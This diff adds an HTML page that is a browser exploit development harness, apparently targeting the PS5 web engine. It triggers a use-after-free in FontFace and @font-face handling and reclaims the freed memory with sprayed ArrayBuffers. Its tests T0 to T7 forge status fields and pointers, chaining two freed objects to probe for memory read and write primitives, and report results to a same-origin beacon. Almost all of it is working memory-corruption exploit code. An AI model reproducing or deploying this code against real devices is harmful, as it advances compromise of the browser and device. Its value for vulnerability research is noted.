@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>P844v16</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#111;color:#0f0;font:11px/1.4 monospace;padding:8px;overflow-y:auto}
+#log{white-space:pre-wrap;word-break:break-all}
+</style>
+</head>
+<body>
+<div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(s){L.textContent+=s+'\n';}
+function bn(tag,data){
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/ps5_beacon.php?tag='+encodeURIComponent(tag)+'&data='+encodeURIComponent(data||''),false);
+    x.send();
+  }catch(e){}
+}
+var KEY='p844v16_test';
+function getTest(){try{return parseInt(localStorage.getItem(KEY))||0;}catch(e){return 0;}}
+function setTest(n){try{localStorage.setItem(KEY,String(n));}catch(e){}}
+function clearTest(){try{localStorage.removeItem(KEY);}catch(e){}}
+var testNum=getTest();
+log('P844v16 BOOT test='+testNum);
+bn('P844v16-BOOT','test='+testNum);
+
+function doUAF(id,cb){
+  var st=document.createElement('style');
+  st.textContent="@font-face{font-family:'UAF"+id+"';src:local(Arial);unicode-range:U+0042;}";
+  document.head.appendChild(st);
+  var face=new FontFace('UAF'+id+'F',"local('Helvetica')",{unicodeRange:'U+0041'});
+  document.fonts.add(face);void face.loaded;
+  var fabs=[],ffired=false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){if(ffired)return undefined;ffired=true;
+      st.remove();st.textContent='';st=null;
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      fabs=[];for(var i=0;i<80;i++)fabs.push(new ArrayBuffer(192));
+      document.body.offsetHeight;
+      return undefined;
+    },set:function(){}});
+  document.fonts.load('1em UAF'+id+'F,UAF'+id,'AB').then(function(){}).catch(function(){});
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var hi=-1,bv=null;
+    for(var i=0;i<fabs.length;i++){var t=new BigUint64Array(fabs[i]);if(t[0]!==0n||t[11]!==0n){hi=i;bv=t;break;}}
+    cb(bv?{abs:fabs,bv:bv,face:face,hitIdx:hi}:null);
+  },800);
+}
+function fin(tag,data){bn(tag,data);log(tag.replace('P844v16-','')+': '+data);setTimeout(function(){location.reload();},100);}
+
+var TESTS=[
+
+// T0: face.load() with FORCED PENDING status (byte+0=0) + gate (byte+4=1)
+// q0 = 0x100000000: status=Pending, gate=ON
+// If face.load() sees Pending it should actually LOAD and WRITE status back!
+function(){
+  setTest(1);
+  doUAF('T0',function(r){
+    if(!r)return fin('P844v16-T0-OK','uaf=miss');
+    var bv=r.bv;
+    var self=bv[11]-BigInt(0x58);
+    // Forced Pending + gate
+    bv[0]=0x100000000n; // byte0=0(Pending), byte4=1(gate)
+    for(var i=1;i<24;i++)bv[i]=self;
+    // Snapshot
+    var snap=new BigUint64Array(24);
+    for(var i=0;i<24;i++)snap[i]=bv[i];
+    try{r.face.load();}catch(e){}
+    setTimeout(function(){
+      var changed=[];
+      for(var i=0;i<24;i++){
+        if(bv[i]!==snap[i])changed.push('q'+i+':0x'+snap[i].toString(16)+'->0x'+bv[i].toString(16));
+      }
+      // Byte-level scan for sub-qword changes
+      var u8=new Uint8Array(r.abs[r.hitIdx]);
+      var bc=[];
+      for(var i=0;i<192;i++){
+        var qi=Math.floor(i/8),bi=i%8;
+        var sb=Number((snap[qi]>>BigInt(bi*8))&0xFFn);
+        if(u8[i]!==sb)bc.push('+'+i+'=0x'+sb.toString(16)+'->0x'+u8[i].toString(16));
+      }
+      fin('P844v16-T0-OK','self=0x'+self.toString(16)+'|qc='+(changed.join(',')||'none')+'|bc='+(bc.join(',')||'none'));
+    },600);
+  });
+},
+
+// T1: Same as T0 but check face properties after
+function(){
+  setTest(2);
+  doUAF('T1',function(r){
+    if(!r)return fin('P844v16-T1-OK','uaf=miss');
+    var bv=r.bv;
+    var self=bv[11]-BigInt(0x58);
+    bv[0]=0x100000000n;
+    for(var i=1;i<24;i++)bv[i]=self;
+    try{r.face.load();}catch(e){}
+    setTimeout(function(){
+      var o=[];
+      try{o.push('fam='+r.face.family);}catch(e){o.push('fam=ERR');}
+      try{o.push('st='+r.face.status);}catch(e){o.push('st=ERR');}
+      // What is q0 now?
+      o.push('q0=0x'+bv[0].toString(16));
+      fin('P844v16-T1-OK',o.join('|')+'|self=0x'+self.toString(16));
+    },600);
+  });
+},
+
+// T2: TWO-UAF REDIRECT — use UAF2's known address for q1
+// Fire UAF1, fire UAF2, set UAF1.q1 = UAF2.self, call face1.load()
+function(){
+  setTest(3);
+  doUAF('A',function(r1){
+    if(!r1)return fin('P844v16-T2-OK','uaf1=miss');
+    var self1=r1.bv[11]-BigInt(0x58);
+    doUAF('B',function(r2){
+      if(!r2)return fin('P844v16-T2-OK','uaf2=miss|self1=0x'+self1.toString(16));
+      var self2=r2.bv[11]-BigInt(0x58);
+      // Fill AB2 with known pattern 0xBBBB...
+      for(var i=0;i<24;i++)r2.bv[i]=0xBBBBBBBBBBBBBBBBn;
+      // Set up AB1: q0=gate+pending, q1=AB2, rest=self1
+      r1.bv[0]=0x100000000n;
+      r1.bv[1]=self2; // q1 → AB2!
+      for(var i=2;i<24;i++)r1.bv[i]=self1;
+      // Call face1.load()
+      try{r1.face.load();}catch(e){}
+      setTimeout(function(){
+        // Check AB2 for modifications
+        var ab2c=[];
+        for(var i=0;i<24;i++){
+          if(r2.bv[i]!==0xBBBBBBBBBBBBBBBBn)ab2c.push('q'+i+'=0x'+r2.bv[i].toString(16));
+        }
+        // Check AB1 for modifications
+        var ab1c=[];
+        if(r1.bv[0]!==0x100000000n)ab1c.push('q0=0x'+r1.bv[0].toString(16));
+        if(r1.bv[1]!==self2)ab1c.push('q1=0x'+r1.bv[1].toString(16));
+        fin('P844v16-T2-OK','s1=0x'+self1.toString(16)+'|s2=0x'+self2.toString(16)+'|ab2='+(ab2c.join(',')||'none')+'|ab1='+(ab1c.join(',')||'none'));
+      },600);
+    });
+  });
+},
+
+// T3: TWO-UAF — point ALL 4 pointers (q1,q8,q10,q11) to AB2
+function(){
+  setTest(4);
+  doUAF('C',function(r1){
+    if(!r1)return fin('P844v16-T3-OK','uaf1=miss');
+    var self1=r1.bv[11]-BigInt(0x58);
+    doUAF('D',function(r2){
+      if(!r2)return fin('P844v16-T3-OK','uaf2=miss');
+      var self2=r2.bv[11]-BigInt(0x58);
+      // AB2: all zeros (let face.load() see Pending everywhere)
+      for(var i=0;i<24;i++)r2.bv[i]=0n;
+      // AB1: gate+pending, all 4 ptrs → AB2
+      r1.bv[0]=0x100000000n;
+      for(var i=1;i<24;i++)r1.bv[i]=self1;
+      r1.bv[1]=self2;  // q1→AB2
+      r1.bv[8]=self2;  // q8→AB2
+      r1.bv[10]=self2; // q10→AB2
+      r1.bv[11]=self2; // q11→AB2
+      try{r1.face.load();}catch(e){}
+      setTimeout(function(){
+        // Check AB2 for writes
+        var nz2=[];
+        for(var i=0;i<24;i++){
+          if(r2.bv[i]!==0n)nz2.push('q'+i+'=0x'+r2.bv[i].toString(16));
+        }
+        fin('P844v16-T3-OK','s1=0x'+self1.toString(16)+'|s2=0x'+self2.toString(16)+'|ab2writes='+(nz2.join(',')||'none'));
+      },600);
+    });
+  });
+},
+
+// T4: face.load() with q0=0 (no gate, status=Pending) + rest=self
+// Dangerous: bg process may crash us. But if face.load() runs first...
+function(){
+  setTest(5);
+  doUAF('E',function(r){
+    if(!r)return fin('P844v16-T4-OK','uaf=miss');
+    var bv=r.bv;
+    var self=bv[11]-BigInt(0x58);
+    bv[0]=0n; // status=0(Pending), gate=0(bg active!)
+    for(var i=1;i<24;i++)bv[i]=self;
+    var snap=new BigUint64Array(24);
+    for(var i=0;i<24;i++)snap[i]=bv[i];
+    try{r.face.load();}catch(e){}
+    // Quick check — bg might crash us soon
+    var changed=[];
+    for(var i=0;i<24;i++){
+      if(bv[i]!==snap[i])changed.push('q'+i+':0x'+snap[i].toString(16)+'->0x'+bv[i].toString(16));
+    }
+    fin('P844v16-T4-OK','self=0x'+self.toString(16)+'|changed='+(changed.join(',')||'none'));
+  });
+},
+
+// T5: TWO-UAF — AB2 has marker values at key offsets for detection
+// AB2.q0=0x4242, q1=0x4343... unique per offset
+// face1.load() with q1→AB2 — check what reads/writes happen
+function(){
+  setTest(6);
+  doUAF('F',function(r1){
+    if(!r1)return fin('P844v16-T5-OK','uaf1=miss');
+    var self1=r1.bv[11]-BigInt(0x58);
+    doUAF('G',function(r2){
+      if(!r2)return fin('P844v16-T5-OK','uaf2=miss');
+      var self2=r2.bv[11]-BigInt(0x58);
+      // AB2: unique markers per qword
+      for(var i=0;i<24;i++)r2.bv[i]=BigInt(0x4200+i)|BigInt(0x4200+i)<<32n;
+      // AB1: gate+pending, q1→AB2, rest=self1
+      r1.bv[0]=0x100000000n;
+      r1.bv[1]=self2;
+      for(var i=2;i<24;i++)r1.bv[i]=self1;
+      try{r1.face.load();}catch(e){}
+      setTimeout(function(){
+        // Check AB2 changes
+        var ab2c=[];
+        for(var i=0;i<24;i++){
+          var exp=BigInt(0x4200+i)|BigInt(0x4200+i)<<32n;
+          if(r2.bv[i]!==exp)ab2c.push('q'+i+'=0x'+r2.bv[i].toString(16));
+        }
+        // Check AB1 q0 for status write
+        ab2c.push('ab1q0=0x'+r1.bv[0].toString(16));
+        fin('P844v16-T5-OK','s1=0x'+self1.toString(16)+'|s2=0x'+self2.toString(16)+'|ab2='+(ab2c.join(',')||'none'));
+      },600);
+    });
+  });
+},
+
+// T6: face.load() with q0=0x100000002 (status=2=Loaded, gate=1) + rest=self
+// Tests: does status=2 also skip? (confirming status enum)
+function(){
+  setTest(7);
+  doUAF('H',function(r){
+    if(!r)return fin('P844v16-T6-OK','uaf=miss');
+    var bv=r.bv;
+    var self=bv[11]-BigInt(0x58);
+    bv[0]=0x100000002n; // status=2(Loaded?), gate=1
+    for(var i=1;i<24;i++)bv[i]=self;
+    var snap=new BigUint64Array(24);
+    for(var i=0;i<24;i++)snap[i]=bv[i];
+    try{r.face.load();}catch(e){}
+    setTimeout(function(){
+      var changed=[];
+      for(var i=0;i<24;i++){
+        if(bv[i]!==snap[i])changed.push('q'+i+':0x'+snap[i].toString(16)+'->0x'+bv[i].toString(16));
+      }
+      fin('P844v16-T6-OK','self=0x'+self.toString(16)+'|changed='+(changed.join(',')||'none'));
+    },600);
+  });
+},
+
+// T7: face.load() with q0=0x100000003 (status=3) + rest=self
+function(){
+  setTest(8);
+  doUAF('I',function(r){
+    if(!r)return fin('P844v16-T7-OK','uaf=miss');
+    var bv=r.bv;
+    var self=bv[11]-BigInt(0x58);
+    bv[0]=0x100000003n;
+    for(var i=1;i<24;i++)bv[i]=self;
+    var snap=new BigUint64Array(24);
+    for(var i=0;i<24;i++)snap[i]=bv[i];
+    try{r.face.load();}catch(e){}
+    setTimeout(function(){
+      var changed=[];
+      for(var i=0;i<24;i++){
+        if(bv[i]!==snap[i])changed.push('q'+i+':0x'+snap[i].toString(16)+'->0x'+bv[i].toString(16));
+      }
+      fin('P844v16-T7-OK','self=0x'+self.toString(16)+'|changed='+(changed.join(',')||'none'));
+    },600);
+  });
+}
+];
+
+var NAMES=['T0-pendingGateLoad','T1-pendingGateProps','T2-dualRedirectQ1','T3-dualAllPtrs',
+  'T4-pendingNoGate','T5-dualMarkerQ1','T6-status2','T7-status3'];
+
+function runTest(){
+  if(testNum>=TESTS.length){
+    log('ALL '+TESTS.length+' TESTS COMPLETE');
+    bn('P844v16-DONE','all='+TESTS.length);
+    clearTest();return;
+  }
+  log('Running '+NAMES[testNum]+'...');
+  try{TESTS[testNum]();}catch(e){
+    bn('P844v16-'+NAMES[testNum]+'-ERR',e.message);
+    setTest(testNum+1);setTimeout(function(){location.reload();},100);
+  }
+}
+setTimeout(runTest,200);
+</script>
+</body>
+</html>
